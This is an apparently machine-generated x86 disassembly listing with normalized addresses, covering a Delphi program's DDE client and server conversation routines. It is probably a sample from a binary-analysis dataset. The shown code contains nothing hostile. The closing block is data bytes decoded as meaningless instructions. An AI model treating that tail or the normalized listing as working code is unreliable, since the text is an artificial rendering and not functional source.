mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_489170
mov edx ebx
call sub_421b4c
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_489938
sub_489938
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_40416c
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call sub_4891a8
test al al
jne r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_40416c
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
call sub_404118
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
cmp [ eax + 0xc5 ] 0x1
je r-xdata
sub_489994
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421d98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
mov edx edi
mov eax [ edi + 0x34 ]
call sub_489170
xor eax eax
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x38 ]
call sub_404118
sub_4899d0
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_403530
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_489a18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404118
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_489a4c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_489a90
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_489d74
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_489abc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push j_sub_403a98#5
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4041b0
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov edx edi
call sub_40416c
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x4 ]
call sub_4043d8
test eax eax
je r-xdata
mov eax esi
call sub_489d74
mov eax esi
call sub_489c44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489b60
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ esi + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ eax + 0xc5 ] 0x1
jne r-xdata
mov eax esi
call sub_489cbc
mov ebx eax
test bl bl
jne r-xdata
mov bl 0x1
lea eax [ esi + 0x4 ]
call sub_404118
jmp r-xdata
sub_489b68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_489c35
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_489cac
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_404310
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_489c44
jmp r-xdata
mov eax ebx
call sub_489dd4
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax ebx
call sub_489cb4
mov eax [ ebx + 0xc ]
cmp [ eax + 0xc7 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489c3c
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov esi 0x1
inc esi
dec edi
jne r-xdata
cmp al 0x20
jae r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + esi - 0x1 ]
test al al
jbe r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_4045e4
mov [ eax + esi - 0x1 ] 0x20
sub_489c44
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov eax [ edi + 0xc ]
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
mov eax edi
call sub_489dd4
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0xc6 ] 0x1
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x3e8
push 0x20b0
mov eax [ eax + 0xa8 ]
push eax
mov eax [ edi + 0x8 ]
push eax
push edx
push 0xffffffff
push 0x0
call DdeClientTransaction
mov esi eax
test esi esi
je r-xdata
mov edx esi
mov eax edi
call sub_489b68
push esi
call DdeFreeDataHandle
mov bl 0x1
jmp r-xdata
sub_489cbc
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] 0x0
mov eax [ ebx + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_4043d8
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push 0x3e8
push 0x1034
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xa8 ]
push edx
mov edx [ ebx + 0x8 ]
push edx
mov eax [ eax + 0x38 ]
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
test eax eax
jne r-xdata
push 0x3ec
mov eax [ ebx + 0x4 ]
call sub_4045d8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x8 ] eax
mov [ esp ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_489d74
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax ebx
call sub_489db4
mov al 0x1
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
push esp
push 0x3e8
push 0x8040
mov ecx [ esi + 0xa8 ]
push ecx
push edx
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
sub_489db4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
sub_489de0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
mov [ esi + 0x48 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_489e2c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_489e6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404118
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_489e98
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x48 ] 0x1
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_489f48
pop esi
pop ebx
retn
sub_489ec4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_489f38
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
pop edx
call sub_4081d8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489f3f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
mov [ ebx + 0x48 ] 0x1
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_489f48
sub_489f48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_489fcf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_488dac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489fd6
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44e8b4
mov edx [ ebp - 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_488dac
sub_489fdc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a98#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call DdeAccessData
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a066
lea eax [ ebp - 0xc ]
call sub_404118
retn
lea eax [ ebp - 0xc ]
mov edx esi
call sub_404310
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
call DdeUnaccessData
mov eax ebx
call sub_489f48
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x8000
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_48a084
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421d98
cmp esi [ edi + 0x34 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_48a0ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
mov edx esi
mov eax [ rw-data ]
call sub_488e10
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_48a0f0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_488e24
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_48a124
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push j_sub_403a98#3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edx
call DdeAccessData
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a1b6
lea eax [ ebp - 0xc ]
call sub_404118
retn
cmp [ esi + 0x42 ] 0x0
je r-xdata
mov edi 0x8000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404310
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_48a1e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_48a22c
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
push eax
call DdeDisconnect
mov eax [ ebp + 0x44 ]
call sub_40331c
xor eax eax
mov [ ebp + 0x44 ] eax
inc esi
xor edi edi
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_421ac8
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebp + 0x34 ] eax
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_418cf8
call sub_40331c
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4036b8
sub_48a2b0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x1008 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_48a3d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a3d7
lea eax [ ebp - 0x100c ]
mov edx 0x2
call sub_40413c
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1001 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1008 ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404388
mov eax [ ebp - 0x1008 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_48a5fc
mov edi eax
test edi edi
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_48a774
mov esi eax
mov [ esi + 0x3c ] edi
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404388
mov edx [ ebp - 0x100c ]
mov eax esi
call sub_48a8d0
mov edx esi
mov eax [ ebx + 0x44 ]
call sub_418b9c
mov edx ebx
mov eax esi
call sub_421b4c
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4045d8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x34 ] eax
sub_48a3e4
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_48a720
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x44 ]
call sub_418e94
mov eax ebx
call sub_40331c
sub_48a414
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1004 ] ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a98#2
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a4be
lea eax [ ebp - 0x1004 ]
call sub_404118
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1004 ]
lea edx [ ebp - 0x1000 ]
mov ecx 0x1000
call sub_404388
mov eax [ ebp - 0x1004 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_48a5fc
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
call sub_489fdc
mov esi eax
sub_48a4c8
push ebp
mov ebp esp
xor edx edx
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
mov eax edx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax ecx
call sub_48a124
mov edx eax
sub_48a4e8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_48a5e9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax ebx
call sub_48a720
test eax eax
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1008 ]
mov ecx 0x1000
call sub_404388
mov eax [ ebp - 0x100c ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_48a5fc
mov ebx eax
test ebx ebx
je r-xdata
mov dx [ ebp + 0x8 ]
call sub_48a7ec
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a5f0
lea eax [ ebp - 0x100c ]
call sub_404118
lea eax [ ebp - 0x8 ]
call sub_404118
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4043d8
inc eax
push eax
mov eax [ ebp - 0x8 ]
call sub_4045d8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov [ ebp - 0x4 ] eax
sub_48a5fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov edi edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
call sub_4220a0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404524
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x4 ]
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48a5fc
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_422074
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
sub_48a6d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_418cf8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx [ esp ]
call sub_404524
jne r-xdata
sub_48a720
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_418cf8
mov ebx eax
mov eax [ esp ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call DdeCmpStringHandles
test eax eax
jne r-xdata
sub_48a774
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x30 ] ecx
xor edx edx
mov eax esi
call sub_421a7c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_48a7ac
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_48a7ec
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48a8a1
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1004 ]
lea eax [ ebx + 0x34 ]
call sub_404208
cmp si 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a8a8
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax si
push eax
mov eax [ ebx + 0x38 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4043d8
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_48a8d0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_40416c
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_4043d8
test eax eax
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
push 0x3ec
mov eax [ ebx + 0x34 ]
call sub_4045d8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x38 ] eax
sub_48a92c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48a95d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a964
retn
mov eax rw-data
call sub_40d814
sub_48a968
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4887bc
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
sub_48a9d0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc0048ac
stosd [ edi ]
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x54 ] ah
dec eax
add [ ebx + eax ] cl
add [ ecx + eax * 2 + 0x46 ] dh
add ah ch
and [ edx ] eax
mov al 0x6d
inc esi
add [ edi + ebp * 2 + 0x46 ] ah
add [ eax + 0x35 ] ah
inc eax
add al dl
xchg ebx eax
inc esi
add [ edx + esi + 0x32d00040 ] dh
inc eax
add ah cl
outsd
inc esi
add ah cl
pop ebx
inc ebp
add [ esi * 2 - 0x6d0bffba ] bh
inc ecx
add [ ecx + esi * 2 + 0x71c80046 ] cl
inc esi
add ah dl
jb r-xdata
out 0x44 al
add [ esi + 0x22040044 ] bl
inc edx
add [ ebx + edi * 2 + 0x46 ] cl
add ah ah
push ds
inc edx
add ah ch
mov dh 0x46
add [ esp + ebp * 2 ] ah
inc esi
add al ah
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ eax + edi * 2 ] ch
inc esi
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax ] ah
jns r-xdata
push eax
inc ebp
add [ eax - 0x43ffb966 ] al
bound eax [ ebp ]
inc esp
dec ebp
inc ebp
add [ edi + ebp * 4 + 0x65180046 ] dl
inc esi
add al cl
inc esi
